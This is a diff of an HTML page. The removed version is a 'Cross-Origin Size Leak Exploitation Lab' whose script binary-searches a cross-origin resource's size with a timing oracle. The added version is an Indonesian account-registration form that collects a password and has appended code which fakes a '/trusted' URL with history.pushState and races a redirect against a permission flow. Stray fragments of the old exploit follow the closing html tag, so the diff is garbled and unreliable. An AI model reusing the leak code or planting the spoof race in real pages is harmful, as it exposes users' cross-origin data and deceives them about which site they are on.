@@ -2,105 +2,238 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Cross-Origin Size Leak Exploitation Lab</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulir Otomatis Valid & Akurat</title>
     <style>
-        *{font-family:'Courier New', monospace;box-sizing:border-box;}
-        body{background:#020204;color:#00ffaa;padding:25px;}
-        #result{max-width:750px;}
-        #result p{padding:10px 14px;margin:6px 0;border-radius:4px;font-size:12px;line-height:1.4;}
-        iframe, audio, video, img{width:1px;height:1px;border:0;opacity:0;position:absolute;}
-        input{width:515px;font-size:14px;padding:12px 16px;border:1px solid #00ffaa;background:#111;color:#fff;}
-        button{font-size:14px;padding:12px 16px;border:1px solid #00ffaa;background:#05140f;color:#00ffaa;cursor:pointer;font-weight:bold;text-transform:uppercase;}
-        button:hover{background:#00ffaa;color:#000;box-shadow:0 0 15px #00ffaa;}
-        .panel{border:1px solid #00ffaa;padding:20px;margin-bottom:15px;background:#010604;}
-        .success{background:#05140f;color:#00ffaa;border:1px solid #00ffaa;}
-        .error{background:#1f0f0f;color:#ff3333;border:1px solid #ff3333;}
-        .info{background:#0a141d;color:#00aaff;border:1px solid #00aaff;}
+        :root {
+            --primary-color: #4f46e5;
+            --error-color: #ef4444;
+            --success-color: #22c55e;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f4f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .form-container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 450px;
+        }
+        h2 {
+            margin-top: 0;
+            color: #1f2937;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #4b5563;
+            font-size: 14px;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #d1d5db;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 15px;
+            transition: all 0.3s ease;
+        }
+        input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.2);
+        }
+        .error-msg {
+            color: var(--error-color);
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+        input.invalid {
+            border-color: var(--error-color);
+            background-color: #fef2f2;
+        }
+        input.valid {
+            border-color: var(--success-color);
+        }
+        button {
+            width: 100%;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        button:hover {
+            background-color: #4338ca;
+        }
+        .success-alert {
+            display: none;
+            background-color: #f0fdf4;
+            color: #166534;
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid #bbf7d0;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        /* Gaya tambahan untuk elemen trigger baru */
+        #trigger {
+            background-color: #10b981;
+            max-width: 450px;
+        }
+        #trigger:hover {
+            background-color: #059669;
+        }
+        #panel {
+            display: none;
+            background-color: #e0f2fe;
+            color: #0369a1;
+            padding: 15px;
+            border-radius: 6px;
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            border: 1px solid #bae6fd;
+        }
     </style>
 </head>
 <body>
-    
-    <h2>Cross-Origin Size Leak Exploitation Laboratory</h2>
 
-    <div class="panel">
-        <form id="form" onsubmit="return false;">
-          <input name="url" id="target-url" value="https://google.com"/>
-          <button type="button" id="btn-run">Execute Full Chain Exploit</button>
-          <button id="export-log-report" type="button" style="background: #142414; display: none;">Download Exploit Log (.TXT)</button>
-        </form>
-    </div>
+<div class="form-container">
+    <h2>Registrasi Akun</h2>
+    <div id="successAlert" class="success-alert">Data berhasil dikirim dengan akurat!</div>
 
-    <div id="result"></div>
+    <form id="autoForm" autocomplete="on" novalidate>
+        <div class="form-group">
+            <label for="fullName">Nama Lengkap</label>
+            <input type="text" id="fullName" name="name" autocomplete="name" required minlength="3">
+            <div class="error-msg" id="nameError">Nama harus diisi (minimal 3 karakter).</div>
+        </div>
 
-    <script>
-        const result = document.getElementById("result");
-        let auditReports = []; 
+        <div class="form-group">
+            <label for="email">Alamat Email</label>
+            <input type="email" id="email" name="email" autocomplete="email" required>
+            <div class="error-msg" id="emailError">Format email tidak valid.</div>
+        </div>
 
-        function writeLog(phase, type, text) {
-            const timestamp = new Date().toLocaleTimeString();
-            auditReports.push(`[${timestamp}] [${phase.toUpperCase()}] [${type.toUpperCase()}] ${text}`);
-            result.innerHTML += `<p class="${type}">[${timestamp}] [${phase}] ${text}</p>`;
-            result.scrollTop = result.scrollHeight;
+        <div class="form-group">
+            <label for="phone">Nomor Telepon</label>
+            <input type="tel" id="phone" name="phone" autocomplete="tel" required pattern="[0-9]{10,14}">
+            <div class="error-msg" id="phoneError">Masukkan nomor telepon yang valid (10-14 digit angka).</div>
+        </div>
+
+        <div class="form-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required minlength="8">
+            <div class="error-msg" id="passwordError">Password minimal 8 karakter.</div>
+        </div>
+
+        <button type="submit">Kirim Data</button>
+    </form>
+</div>
+
+<!-- Elemen pendukung untuk fungsi kode tambahan Anda -->
+<button id="trigger">Aktifkan Trigger Panel</button>
+<div id="panel">Panel Rahasia Terbuka!</div>
+
+<script>
+    const form = document.getElementById('autoForm');
+    const successAlert = document.getElementById('successAlert');
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const phoneRegex = /^[0-9]{10,14}$/;
+
+    function validateField(input, condition, errorEl) {
+        if (condition) {
+            input.classList.remove('invalid');
+            input.classList.add('valid');
+            errorEl.style.display = 'none';
+            return true;
+        } else {
+            input.classList.remove('valid');
+            input.classList.add('invalid');
+            errorEl.style.display = 'block';
+            return false;
         }
+    }
 
-        const runExploitChain = async (url, minSize, maxSize) => {
-            let foundSize = -1;
-            document.getElementById("export-log-report").style.display = "none";
-            
-            writeLog('EXPLOIT_INIT', 'info', "Mengaktifkan pipa pengujian sekuensial. Meluncurkan Data-URI Verification Bridge...");
-            
-            while (minSize <= maxSize) {
-                let mid = Math.floor((minSize + maxSize) / 2);
-                
-                let isAtLeastMid = await evaluateLifecycleOracle(url, mid);
-                
-                if (isAtLeastMid) {
-                    writeLog(`MID_${mid}`, 'error', `Vektor Validasi: Mengonfirmasi pemuatan fragmen data melampaui tebakan ${mid} bytes.`);
-                    foundSize = mid + 1;
-                    minSize = mid + 1;
-                } else {
-                    writeLog(`MID-${mid}`, 'success', `Vektor Validasi: Mengonfirmasi pemuatan fragmen data berada di bawah tebakan ${mid} bytes.`);
-                    maxSize = mid - 1;
-                }
-                
-                await new Promise(r => setTimeout(r, 40));
-            }
-            writeLog('SUCCESS', 'success', "=== EXECUTE FULL CHAIN EXPLOIT COMPLETE ===");
-            writeLog('SUCCESS', 'success', `Metadata analisis berhasil dikumpulkan. Batas konvergensi: <b>${foundSize}</b> bytes.`);
-            document.getElementById("export-log-report").style.display = "inline-block";
-        };
+    document.getElementById('fullName').addEventListener('input', function() {
+        validateField(this, this.value.trim().length >= 3, document.getElementById('nameError'));
+    });
 
-        // REKAYASA PENGUATAN: Memanfaatkan Data-URI untuk Bypass Galat HTTP 404 pada Konsol
-        const evaluateLifecycleOracle = (url, size) => {
-            return new Promise((resolve) => {
-                const uniqueId = `cb_${Math.floor(Math.random() * 10000000)}`;
-                const targetUrl = `${url}?size=${size}&${uniqueId}`;
-                
-                let mediaElement = document.createElement("video");
-                let hasResolved = false;
+    document.getElementById('email').addEventListener('input', function() {
+        validateField(this, emailRegex.test(this.value), document.getElementById('emailError'));
+    });
 
-                const triggerNetworkVerification = async () => {
-                    if (hasResolved) return;
-                    hasResolved = true;
+    document.getElementById('phone').addEventListener('input', function() {
+        validateField(this, phoneRegex.test(this.value), document.getElementById('phoneError'));
+    });
 
-                    const testStart = performance.now();
-                    try {
-                        // REKAYASA STRATEGI: Mengganti fetch fisik dengan elemen gambar berbasis Data-URI
-                        // GIF Transparan 1x1 piksel disuntikkan langsung untuk memicu deteksi kecepatan pemrosesan memori
-                        const checkImg = new Image();
-                        
-                        checkImg.onload = checkImg.onerror = () => {
-                            const duration = performance.now() - testStart;
-                            // Metrik Toleransi disesuaikan karena pemrosesan Data-URI berjalan sangat cepat tanpa latensi server
-                            if (duration < 15) {
-                                terminateMedia(mediaElement);
-                                resolve(false);
-                            } else {
-                                terminateMedia(mediaElement);
-                                resolve(true);
-                            }
-                        };
+    document.getElementById('password').addEventListener('input', function() {
+        validateField(this, this.value.length >= 8, document.getElementById('passwordError'));
+    });
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const isNameValid = validateField(fullName, fullName.value.trim().length >= 3, document.getElementById('nameError'));
+        const isEmailValid = validateField(email, emailRegex.test(email.value), document.getElementById('emailError'));
+        const isPhoneValid = validateField(phone, phoneRegex.test(phone.value), document.getElementById('phoneError'));
+        const isPasswordValid = validateField(password, password.value.length >= 8, document.getElementById('passwordError'));
+
+        if (isNameValid && isEmailValid && isPhoneValid && isPasswordValid) {
+            successAlert.style.display = 'block';
+            form.reset();
+            document.querySelectorAll('input').forEach(input => input.classList.remove('valid'));
+            setTimeout(() => { successAlert.style.display = 'none'; }, 4000);
+        }
+    });
+
+    /* 
+     * KODE TAMBAHAN ANDA DI PALING BAWAH
+     */
+    trigger.onclick = () => {
+      history.pushState({}, '', '/trusted');
+      panel.style.display = 'block';
+    };
+
+    /*
+     * Step 2:
+     * Trigger a navigation race shortly after permission flow starts
+     */
+    window.addEventListener('pageshow', () => {
+      requestAnimationFrame(() => {
+        requestAnimationFrame(() => {
+          setTimeout(() => {
+            location.href = 'https://google.com:9090';
+          }, 80);
+        });
+      });
+    });
+</script>
+
+</body>
+</html>
                         
                         // Menembakkan muatan Base64 instan
                         checkImg.src = "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
